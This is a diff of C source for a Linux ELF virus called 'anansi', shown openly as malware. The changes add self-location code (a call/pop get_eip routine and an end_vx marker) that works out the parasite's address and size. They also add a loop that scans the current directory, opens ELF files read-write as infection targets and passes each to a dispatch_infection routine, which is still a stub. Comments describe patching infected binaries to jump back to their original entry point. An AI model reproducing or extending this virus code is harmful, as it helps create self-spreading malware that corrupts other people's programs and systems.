@@ -63,9 +63,11 @@ typedef struct elfbin {
 extern unsigned long real_start;
 
 // functions unique to anansi
+int dispatch_infection(Elfbin *target);
+void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size);
 char *create_full_path(char *directory, char *filename);
-void process_elf_initialize(Elfbin *c);
-int process_elf(Elfbin *c, int attr, int perm, int len, char *p);
+void process_elf_initialize(Elfbin *c, char *full_path);
+int process_elf(Elfbin *c, int attr, int perm, int len);
 void process_elf_free(Elfbin *c);
 bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);
 
@@ -75,6 +77,13 @@ bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);
 	char *itoa_final(long n, int base);
 #endif
 
+/* vx-mechanics functions and global vars*/
+void end_code();
+unsigned long get_eip();
+
+extern unsigned long real_start;
+extern unsigned long end_vx;
+extern unsigned long foobar;
 
 // anansi syscall prototypes
 int anansi_exit(int status);
@@ -158,6 +167,16 @@ void vx_main()
 
 	Elfbin target;
 
+	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
+
+	//subtract 5 to account call foobar instruction length
+	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start)  - 5; //calculates the address of vx_main
+
+#ifdef DEBUG
+	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
+	anansi_printf("vx_size @ 0x%lx\n", vx_size);
+#endif
+
 	if(!(cwd = anansi_malloc(PATH_MAX))) {
 		status = FAILURE;
 		goto clean_up;
@@ -178,6 +197,9 @@ void vx_main()
 	d = (struct linux_dirent *)cwd_listings;
 	attr = PROCESS_ELF_EHDR | PROCESS_ELF_PHDR | PROCESS_ELF_SHDR;
 
+	target.vx_size = vx_size;
+	target.vx_start = vx_start;
+
 	for(long entry = 0; entry < nread; entry += d->d_reclen) {
 		d = (struct linux_dirent *) (cwd_listings + entry);
 		if(d->d_name[0] == '.' )
@@ -189,19 +211,16 @@ void vx_main()
 		if(!(full_path = create_full_path(cwd, d->d_name)))
 			continue;
 
-		process_elf_initialize(&target);
-
-		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, PAGE_SIZE, full_path) == SUCCESS)
+		process_elf_initialize(&target, full_path);
+		write_vx_meta_data(&target, vx_start, vx_size);
+		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, PAGE_SIZE) == SUCCESS)
 			if (valid_target(&target, sizeof(Elf64_Ehdr), false)) {
-#ifdef DEBUG
-				anansi_printf("%s\n", full_path);
-#endif
+				dispatch_infection(&target);
 				max_target--;
 			}
 
 		anansi_munmap(full_path, anansi_strlen(full_path) + 1);
 		process_elf_free(&target);
-
 	}
 
 clean_up:
@@ -210,6 +229,21 @@ clean_up:
 	if(cwd_listings != NULL)
 		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
 	anansi_exit(status);
+}
+
+int dispatch_infection(Elfbin *target)
+{
+#ifdef DEBUG
+	anansi_printf("Viable target: %s\n", target->f_path);
+#endif
+
+	return 0;
+}
+
+void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size)
+{
+	target->vx_start = vx_start;
+	target->vx_size = vx_size;
 }
 
 /* c - Elfbin type struct where process_elf will write to.
@@ -230,11 +264,12 @@ clean_up:
  */
 
 
-int process_elf(Elfbin *target, int attr, int perm, int len, char *p)
+int process_elf(Elfbin *target, int attr, int perm, int len)
 {
 	int fd;
 	void *mem = NULL;
 	struct stat fs;
+	char *p = target->f_path;
 
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
@@ -331,10 +366,11 @@ int process_elf(Elfbin *target, int attr, int perm, int len, char *p)
  - Necessary for process_elf_free() to work correctly.
 */
 
-void process_elf_initialize(Elfbin *c)
+void process_elf_initialize(Elfbin *c, char *full_path)
 {
 	anansi_memset(c, 0, sizeof(Elfbin));
 	c->initializer_ran = MAGIC_INITIALIZER_RAN;
+	c->f_path = full_path;
 }
 
 /*
@@ -817,3 +853,26 @@ __open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int)
 __getdents64_syscall(long, anansi_getdents64, fd, int, dirp, void *, count, size_t);
 __getcwd_syscall(long, anansi_getcwd, buf, char *, size, size_t);
 __close_syscall(long, anansi_close, fd, int);
+
+/*
+-  Code "end_vx" will serve as the exit routine for when the virus executes via "./anansi" (not as a parasite with it infects a binary).
+-  The label (end_vx) will also be used to calculate the parasite size. During parasitic infection this portion of the code is be patch with a "jmp" to the OEP of the binary to restore non-parasitic execution.
+*/
+
+/*
+-  Dev Note: Write out exit (syscall) routine.
+*/
+
+unsigned long get_eip() {
+	asm("call foobar\n"
+		".globl foobar\n"
+		"foobar:\n"
+		"pop %rax\n");
+}
+
+void end_code() {
+	asm(".globl end_vx\n"
+		"end_vx:\n"
+		"nop\n");
+
+}
